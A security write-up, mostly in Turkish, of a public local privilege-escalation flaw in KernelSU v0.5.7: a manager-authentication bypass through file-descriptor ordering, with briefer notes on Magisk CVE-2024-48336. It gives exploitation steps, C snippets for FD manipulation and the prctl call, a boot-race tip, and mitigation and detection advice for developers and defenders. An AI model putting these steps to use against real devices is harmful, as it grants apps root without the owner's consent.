# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch ve SKRoot gibi Rooting frameworks, Android/Linux kernel’ini patch’ler veya hook’lar ve ayrıcalıksız bir userspace manager app’e ayrıcalıklı işlevler sunar. Magisk aşağıda ayrı olarak ele alınmaktadır; çünkü CVE-2024-48336, bu KernelSU syscall path yerine manager-side code loading ile ilgiliydi.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Bu sayfa, hem red hem de blue teams’in attack surfaces, exploitation primitives ve sağlam mitigations konularını anlamasına yardımcı olmak amacıyla public research kapsamında ortaya çıkarılan teknikleri ve tuzakları (özellikle Zimperium’un KernelSU v0.5.7 analizini) soyutlar.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7’de, kernel üzerindeki bir hook, userspace’ten gelen bir magic value, command ID ve command-specific arguments alır.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller önce `CMD_BECOME_MANAGER` ile manager status ister. Authorization command-specific’tir: `CMD_GRANT_ROOT`, manager/allowlist state’i kontrol eder; `CMD_ALLOW_SU` yalnızca manager’a açıktır; `CMD_SET_SEPOLICY` ise bu version’da yalnızca root’a açıktır.<sup>[[2]](#references)[[11]](#references)</sup>
- Diğer commands, version/configuration bilgilerini sorgular veya framework events bildirir.<sup>[[2]](#references)</sup>
- Her app bu syscall interface’i invoke edebildiğinden, manager authentication’ın doğruluğu kritik öneme sahiptir.<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler’a yönlendirmek için magic value: 0xDEADBEEF
- Commands şunları içerir: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, vb.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

Userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` çağrısı yaptığında KernelSU şunları doğrular:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Sağlanan path, caller UID için beklenen bir prefix ile başlamalıdır; örneğin `/data/data/<pkg>` veya `/data/user/<id>/<pkg>`.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path, caller UID’ye ait olmalıdır.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan üzerinden APK signature check
- Calling process’in open file descriptors listesini artan descriptor order ile dolaşır.
- Path’i `/data/app/` ile başlayan ve `/base.apk` ile biten her regular file için, path’in sağlanan data-directory path’inden türetilen package substring’ini içermesi gerekir.
- Bu path checks’ten geçen ilk candidate’ın signature’ını verify eder.
- APK v2 signature’ını parse eder ve official manager certificate’a karşı verify eder.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Tüm checks başarılı olursa kernel, manager’ın UID’sini geçici olarak cache’ler; ardından manager-only commands bu UID’yi kabul ederken diğer commands kendi UID’lerini veya allowlist checks’lerini kullanmaya devam eder.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7, signature result’ını PackageManager’ın installed package identity’sine bind etmez. `manager.c` içindeki package test yalnızca bir path substring check’tir (`strstr(cwd, pkg)`); ardından bu testi geçen ilk candidate signature-check edilir. Bu nedenle attacker, genuine manager APK’yı attacker’ın package name’ini de içeren bir `/data/app/` path’i altına yerleştirebilir ve seçilecek ilk candidate olmasını sağlayabilir.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Bu trust-by-indirection, ayrıcalıksız bir app’in manager’ın signing key’ine sahip olmadan manager’ı impersonate etmesini sağlar.<sup>[[1]](#references)</sup>

Exploited key properties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan, descriptor index’e göre sıralanır ve package check, verified package-to-APK identity binding yerine bir path substring testidir.
- `open()` en düşük kullanılabilir FD’yi döndürür. Attacker, önce daha düşük numaralı FDs’leri kapatarak ordering’i kontrol edebilir.
- Bundled manager APK, official manager signature’ını korurken attacker’ın package string’ini içeren bir `/data/app/` path’i altına yerleştirilebilir.

---
## Attack preconditions

Somut KernelSU v0.5.7 case’i şunları gerektirir:<sup>[[1]](#references)[[3]](#references)</sup>

- Device’ın zaten vulnerable bir Rooting framework (ör. KernelSU v0.5.7) ile root edilmiş olması.
- Attacker’ın locally arbitrary unprivileged code çalıştırabilmesi (Android app process).
- v0.5.7 implementation için `current->real_parent` UID 0 olmalıdır (source comment bunu zygote direct-child requirement olarak açıklar); `manager.c` diğer parent’ları reject eder.<sup>[[3]](#references)</sup>
- Real manager’ın henüz authenticate olmamış olması (ör. reboot’un hemen ardından). Bazı frameworks success sonrasında manager UID’sini cache’ler; race’i kazanmanız gerekir.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (demo video, public proof of concept’in çalışmasını gösterir):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Prefix ve ownership checks’i karşılamak için kendi app data directory’nize geçerli bir path oluşturun.
2) Genuine KernelSU Manager `base.apk` dosyasını, package string’inizi içeren bir path altında `/data/app/` içine yerleştirin ve kendi `base.apk` dosyanızdan daha düşük numaralı bir FD üzerinden açın.
3) Checks’leri geçmek için `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` invoke edin.
4) `CMD_GRANT_ROOT`, ardından kalıcı `su` için `CMD_ALLOW_SU` kullanın; root-only `CMD_SET_SEPOLICY` komutunu yalnızca root elde ettikten sonra ve desteklendiği yerlerde invoke edin.

Step 2 (FD ordering) için pratik notlar:<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlinks’lerini dolaşarak kendi `/data/app/*/base.apk` dosyanız için process’inizin FD’sini identify edin.
- Düşük numaralı bir FD’yi (ör. stdin, fd 0) kapatın ve legitimate manager APK’yı ilk olarak açın; böylece fd 0’ı (veya kendi `base.apk` FD’nizden daha düşük herhangi bir index’i) almasını sağlayın.
- Legitimate manager APK’yı app’inizle birlikte bundle edin; böylece path `/data/app/` ile başlamalı, `/base.apk` ile bitmeli ve package string’inizi içermelidir. Örneğin app’inizin `lib` directory’si altındaki bir path bu checks’i karşılayabilir.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Open FDs’leri enumerate ederek `base.apk` entries’lerini bulun:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Daha düşük numaralı bir FD'yi meşru manager APK'sını gösterecek şekilde zorlayın:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 `prctl` hook'u üzerinden Manager kimlik doğrulaması:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Başarı sonrasında ayrıcalıklı komutlar (örnekler):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: mevcut process'i root seviyesine yükselt
- CMD_ALLOW_SU: kalıcı su için package/UID'nizi allowlist'e ekle
- CMD_SET_SEPOLICY: root elde ettikten sonra SELinux policy'yi ayarla; KernelSU v0.5.7 bu komut için UID 0 kontrolü yapar.<sup>[[2]](#references)</sup>

Race/persistence ipucu:
- AndroidManifest'te (`RECEIVE_BOOT_COMPLETED`) bir BOOT_COMPLETED receiver'ı kaydederek reboot sonrasında başlatın ve gerçek manager'dan önce authentication yapmayı deneyin; bu permission, `ACTION_BOOT_COMPLETED` alımına izin verir ancak scheduling priority'yi tek başına garanti etmez.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection ve mitigation rehberi

Framework geliştiricileri için:
- Authentication'ı rastgele FD'lere değil, çağıranın package/UID'sine bağlayın:
- Çağıranın package'ını UID'sinden çözümleyin ve FD'leri taramak yerine installed package'ın signature'ı ile (PackageManager aracılığıyla) doğrulayın.
- Yalnızca kernel kullanılıyorsa kararlı çağıran kimliği (task creds) kullanın ve process FD'leri yerine init/userspace helper tarafından yönetilen kararlı bir doğruluk kaynağında doğrulama yapın.
- Kimlik olarak path-prefix kontrollerini kullanmayın; bunlar çağıran tarafından kolayca karşılanabilir.
- Channel üzerinden nonce tabanlı challenge–response kullanın ve boot sırasında veya önemli olaylarda cache'lenmiş manager kimliğini temizleyin.
- Uygun olduğunda generic syscall'leri aşırı yüklemek yerine binder tabanlı authenticated IPC kullanmayı değerlendirin.

Defenders/blue team için:
- Rooting framework'lerinin ve manager process'lerinin varlığını tespit edin; kernel telemetry'niz varsa şüpheli magic constant'larla (ör. 0xDEADBEEF) yapılan prctl çağrılarını izleyin.<sup>[[1]](#references)[[11]](#references)</sup>
- Yönetilen fleet'lerde, boot sonrasında ayrıcalıklı manager komutlarını hızla denemeye başlayan güvenilmeyen package'ların boot receiver'ları için block veya alert uygulayın.
- Cihazların patched framework sürümlerine güncellendiğinden emin olun; update sonrasında cache'lenmiş manager ID'lerini geçersiz kılın.

Saldırının sınırlamaları:<sup>[[1]](#references)[[2]](#references)</sup>
- Yalnızca zaten vulnerable bir framework ile rooted durumda olan cihazları etkiler.
- Genellikle legitimate manager authentication yapmadan önce bir reboot/race window gerekir (bazı framework'ler resetlenene kadar manager UID'sini cache'ler).

---
## Framework'ler arasındaki ilgili notlar

- Password tabanlı auth (ör. historical APatch/SKRoot build'leri), password'ların tahmin edilebilir/bruteforce edilebilir olması veya validation'ların hatalı olması durumunda zayıf olabilir.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature tabanlı auth (ör. KernelSU) prensipte daha güçlüdür; ancak FD taramaları üzerinden seçilen path-derived artefact'lara değil, gerçek çağırana bağlanmalıdır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336, doğrulanmamış bir GMS package'ından code yükleyen pre-Canary 27007 build'lerini etkiledi; bu durum local bir app'in Magisk app'i içinde code execute etmesine ve user interaction olmadan root'a yükselmesine olanak sağladı.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Tüm Kötülüklerin Rooting'i: Mobile Cihazınızı Tehlikeye Atabilecek Security Açıkları](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication kontrolleri](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iterasyonu, package kontrolü ve signature çağrısı](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 doğrulaması](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU projesi](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS'nin system app olduğunu doğrulama](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo videosu (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifier'ları](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
